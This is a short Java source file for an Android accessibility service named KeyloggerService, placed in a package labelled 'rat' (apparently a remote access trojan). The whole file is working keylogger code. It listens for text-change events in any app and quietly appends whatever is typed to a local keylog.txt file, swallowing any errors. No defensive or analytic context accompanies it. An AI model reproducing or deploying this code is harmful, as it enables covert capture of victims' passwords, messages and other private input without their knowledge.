package com.yourpackage.rat;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.FileOutputStream;
import java.io.PrintWriter;

public class KeyloggerService extends AccessibilityService {
    private PrintWriter writer;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getSource() != null) {
                CharSequence text = event.getText() != null && !event.getText().isEmpty() ?
                    event.getText().get(0) : null;
                if (text != null && text.length() > 0) {
                    try {
                        if (writer == null) {
                            writer = new PrintWriter(
                                new FileOutputStream(getFilesDir() + "/keylog.txt", true)
                            );
                        }
                        writer.println(text);
                        writer.flush();
                    } catch (Exception ignored) {}
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        if (writer != null) {
            writer.close();
        }
        super.onDestroy();
    }
}